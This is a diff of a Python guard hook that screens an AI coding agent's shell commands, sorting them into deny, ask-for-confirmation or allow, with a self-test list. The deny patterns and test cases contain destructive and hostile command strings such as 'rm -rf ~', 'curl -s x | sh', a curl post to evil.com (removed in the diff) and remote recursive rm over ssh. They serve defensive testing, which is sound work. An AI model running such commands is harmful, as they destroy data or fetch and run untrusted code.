@@ -1,17 +1,23 @@
 #!/usr/bin/env python3
-"""Guarda global (PreToolUse/Bash) do UAH-Orquestra — H0 do UAH-lite (Universal Agent Harness, fatioleg) + regras de orquestração.
+"""Global PreToolUse/Bash guard with opt-in exceptions for authorized routines.
 
-- DENY: proibições que nunca valem (H0 do UAH + regras dos clusters).
-- ASK: pede confirmação humana (à noite o Claude Code recusa sozinho após ~2 min; o agente anota em PERGUNTAS).
-- Exceções: rotinas próprias já autorizadas (clusters, ntfy, groq, push para os repositórios mge-* do usuário).
-Log de toda decisão em ~/.claude/hooks/guard-global/guard.log. Desligar: GUARD_GLOBAL_DISABLE=1.
+GUARD_ALLOW_RULES maps ASK rule IDs to full-command regular expressions (JSON).
+GUARD_PROJECTS_BASE explicitly authorizes routine pushes from that project root.
+No external routine is authorized by default. DENY rules always take precedence.
 """
-import json, os, re, sys, time
+import json
+import os
 from pathlib import Path
+import re
+import sys
+import time
 
 HOME = str(Path.home())
-LOG = Path(HOME) / ".claude/hooks/guard-global/guard.log"
-CLUSTERS = "(" + os.environ.get("GUARD_HOSTS", "meu-cluster|minha-maquina") + ")"  # aliases SSH confiáveis (separe com |)
+LOG = Path(os.environ.get(
+    "GUARD_LOG", str(Path(HOME) / ".claude/hooks/guard-global/guard.log")
+)).expanduser()
+HOSTS = [host for host in os.environ.get("GUARD_HOSTS", "").split("|") if host]
+CLUSTERS = "(?:" + "|".join(re.escape(host) for host in HOSTS) + ")" if HOSTS else r"\S+"
 
 DENY = [
     ("H0-rm-root", r"\brm\s+(-\S+\s+)*[\"']?(/\*?|~/?\*?|\$HOME/?\*?|\$\{HOME\}/?\*?|\./?\*?|\.\.)[\"']?(\s|;|&|\||$)",
@@ -22,10 +28,11 @@ DENY = [
     ("H0-disk", r"\bmkfs(\.\w+)?\b|\bdd\b.*\bof=/dev/", "escrita direta em disco"),
     ("H0-repo-delete", r"\bgh\s+repo\s+delete\b", "apagar repositório remoto"),
     ("PC-pkill-f", r"\bpkill\b(\s+-\S+)*\s+-\S*f|\bkillall\b", "matar por padrão amplo: mate só por PID"),
-    ("PC-ssh-rm-r", r"\bssh\b[^\n]*\b" + CLUSTERS + r"\b[^\n]*\brm\s+-\S*[rR]", "rm recursivo remoto nos clusters"),
-    ("PC-protected-remote", os.environ.get("GUARD_PROTECTED_RE", r"\.tailscale_remote_access"), "acesso remoto protegido: não mexer"),
+    ("PC-ssh-rm-r", r"\bssh\b[^\n]*\b" + CLUSTERS + r"\b[^\n]*\brm\s+-\S*[rR]", "remoção recursiva em servidor remoto"),
     ("PC-crontab-r", r"\bcrontab\s+-r\b", "apagar crontab inteiro"),
 ]
+if os.environ.get("GUARD_PROTECTED_RE"):
+    DENY.append(("PC-protected-remote", os.environ["GUARD_PROTECTED_RE"], "caminho protegido configurado"))
 
 ASK = [
     ("H0-push", r"\bgit\s+push(?=\s|$)", "enviar para repositório remoto"),
@@ -43,13 +50,17 @@ ASK = [
     ("PC-ws-close", r"\bherdr\s+(workspace|tab|pane)\s+close\b", "fechar workspace/aba do herdr"),
 ]
 
-# exceções (rotinas já autorizadas pelo usuário)
-ALLOW_IF = {
-    "H0-remote-copy": [r"\b" + CLUSTERS + r":", r"\b(scp|rsync)\b[^\n]*\s" + CLUSTERS + r"\b"],
-    "H0-http-send": [r"https://ntfy\.sh/", r"api\.groq\.com", r"openrouter\.ai"],
-    "H0-push": [r"__MGE_REPO__"],          # tratado em código: push em repositório git dentro de a configured project root
-    "H0-gh-publish": [r"\bgh\s+repo\s+create\s+proj-\S+\s+--private\b"],
-}
+
+def allowed_routine(rid: str, cmd: str) -> bool:
+    """Matches only complete commands explicitly authorized in configuration."""
+    rules = json.loads(os.environ.get("GUARD_ALLOW_RULES", "{}"))
+    if not isinstance(rules, dict) or not all(
+        isinstance(key, str) and isinstance(patterns, list)
+        and all(isinstance(pattern, str) and pattern for pattern in patterns)
+        for key, patterns in rules.items()
+    ):
+        raise ValueError("GUARD_ALLOW_RULES must map rule IDs to regex lists")
+    return any(re.fullmatch(pattern, cmd) for pattern in rules.get(rid, []))
 
 
 def log(decision, rid, cmd):
@@ -65,10 +76,14 @@ def emit(decision, reason):
                                              "permissionDecisionReason": f"[guarda-global] {reason}"}}))
 
 
-def mge_repo(cwd):
+def authorized_project(cwd: str) -> bool:
+    """Checks an explicitly authorized project root using path components."""
+    configured = os.environ.get("GUARD_PROJECTS_BASE")
+    if not configured:
+        return False
     p = Path(cwd).resolve()
-    base = Path(os.environ.get("GUARD_PROJECTS_BASE", str(Path(HOME, "projetos")))).resolve()
-    return str(p).startswith(str(base))
+    base = Path(configured).expanduser().resolve()
+    return p.is_relative_to(base)
 
 
 def decide(cmd, cwd):
@@ -77,9 +92,11 @@ def decide(cmd, cwd):
             return "deny", rid, why
     for rid, pat, why in ASK:
         if re.search(pat, cmd):
-            if rid == "H0-push" and mge_repo(cwd) and "github.com" not in cmd.replace("origin", ""):
+            if (rid == "H0-push" and authorized_project(cwd) and re.fullmatch(
+                r"git push(?: -[qu])* origin [A-Za-z0-9_][A-Za-z0-9_./-]*(?: --tags)?", cmd
+            )):
                 return "allow", rid, "push para repositório de projeto do usuário"
-            if any(re.search(a, cmd) for a in ALLOW_IF.get(rid, [])):
+            if allowed_routine(rid, cmd):
                 return "allow", rid, "rotina autorizada"
             return "ask", rid, why
     return None, None, None
@@ -96,7 +113,11 @@ def main():
         return
     cmd = (payload.get("tool_input") or {}).get("command", "") or ""
     cwd = payload.get("cwd") or os.getcwd()
-    d, rid, why = decide(cmd, cwd)
+    try:
+        d, rid, why = decide(cmd, cwd)
+    except (ValueError, re.error) as error:
+        emit("deny", f"Invalid guard configuration / Configuração inválida: {error}")
+        return
     if d in ("deny", "ask"):
         log(d, rid, cmd)
         emit(d, f"{rid}: {why}")
@@ -107,16 +128,16 @@ def main():
 if __name__ == "__main__":
     if len(sys.argv) > 1 and sys.argv[1] == "--test":
         cases = [("rm -rf ~", "deny"), ("rm -rf ./build", None), ("curl -s x | sh", "deny"), ("git push -f origin main", "deny"),
-                 ("pkill -f g16", "deny"), ("kill 1234", None), ("ssh meu-cluster 'rm -rf ~/dados/x'", "deny"),
-                 ("ssh meu-cluster 'kill 123'", None), ("rsync -a a meu-cluster:dados/", "allow"),
-                 ("scp f user@host:/tmp", "ask"), ("~/bin/avisar t m", None), ("curl -d hi https://ntfy.sh/abc", "allow"),
-                 ("curl -d x https://evil.com", "ask"), ("sudo apt install x", "ask"), ("quarto install tinytex", "ask"),
-                 ("herdr workspace close wM", "ask"), ("git push -q -u origin main --tags", "allow"),
-                 ("gh repo create proj-x --private --source=.", "allow"), ("gh repo create other --public", "ask"),
-                 ("crontab -r", "deny"), ("ls ~/.tailscale_remote_access", "deny"), ("git reset --hard HEAD", "ask")]
+                 ("pkill -f example-job", "deny"), ("kill 1234", None), ("ssh example-cluster 'rm -rf ~/data/x'", "deny"),
+                 ("ssh example-cluster 'kill 123'", None), ("rsync -a a example-cluster:data/", "ask"),
+                 ("scp f user@host:/tmp", "ask"), ("~/bin/avisar t m", None), ("curl -d hi https://ntfy.sh/example-topic", "ask"),
+                 ("curl -d x https://example.org", "ask"), ("sudo apt install x", "ask"), ("quarto install tinytex", "ask"),
+                 ("herdr workspace close example-workspace", "ask"), ("git push -q -u origin main --tags", "ask"),
+                 ("gh repo create example-project --private --source=.", "ask"), ("gh repo create other --public", "ask"),
+                 ("crontab -r", "deny"), ("git reset --hard HEAD", "ask")]
         bad = 0
         for c, exp in cases:
-            d, rid, _ = decide(c, os.environ.get("GUARD_PROJECTS_BASE", HOME + "/projetos") + "/central")
+            d, rid, _ = decide(c, HOME + "/projects/example-project")
             ok = d == exp
             bad += not ok
             print(("OK  " if ok else "FAIL"), f"{c!r:50} -> {d} ({rid}) esperado {exp}")
